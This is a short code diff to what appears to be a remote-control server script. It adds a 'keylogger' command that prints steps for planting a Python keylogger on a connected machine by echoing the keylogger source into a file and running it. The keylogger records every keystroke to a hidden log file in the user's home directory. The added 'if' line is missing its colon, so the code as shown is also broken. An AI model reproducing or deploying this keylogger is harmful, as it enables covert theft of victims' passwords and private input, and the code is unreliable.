@@ -99,6 +99,11 @@ while True:
         result = client[0].recv(1024).decode()
         print(result)
 
+    if cmd.lower() in ['keylogger', 'kl']
+        print('run this first \npip install pynput')
+        print('then this \necho exec("""\nimport os\nimport logging\nfrom pynput.keyboard import Listener\n\nif os.name != "nt":\n    pass\n\nif os.name == "nt": # WINDOWS ONLY\n    log_dir = f"{os.path.expanduser("~")}\\\\logdir" # Add the directory where the file will be saved, add it like this C:\\\\dir\\\\dir2\\\\dir3\\\\\nelif os.name == "posix": # LINUX ONLY\n    log_dir = f"{os.path.expanduser("~")}/logdir" # Add the directory where the file will be saved, add it like this /dir1/dir2/dir3\n\nlogging.basicConfig(filename=(log_dir + "Out"), level=logging.DEBUG, format="%(asctime)s: %(message)s")\n\n\ndef on_press(key):\n    logging.info(str(key))\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()\n""") >> test.py')
+        print('and after that you can run python3 test.py')
+
 
     client[0].close()
     cmd = input('Wait for new client Y/n ') or 'y'
